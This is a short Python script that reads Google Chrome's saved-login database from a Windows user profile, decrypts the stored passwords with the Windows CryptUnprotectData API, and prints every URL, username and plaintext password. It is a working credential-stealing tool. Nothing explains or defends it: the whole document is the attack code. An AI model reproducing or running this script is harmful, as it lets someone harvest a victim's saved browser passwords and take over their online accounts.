#!/usr/bin/env python
#----import--#
import sqlite3 as sq
import os
import win32crypt as wc

def get_chrome():
	data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
	c = sq.connect(data_path)
	cursor = c.cursor()
	select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
	cursor.execute(select_statement)
	login_data = cursor.fetchall()
	cred = {}
	string = ""
	for url, user_name, pwd in login_data:
		pwd = wc.CryptUnprotectData(pwd)
		cred[url] = (user_name, pwd[1].decode("utf8"))
		string += '\n[+] URL: %s \n USERNAME: %s \n PASSWORD: %s \n' %(url, user_name, pwd[1].decode('utf8'))
		print (string)
		
		
if __name__  == '__main__' :
	get_chrome()
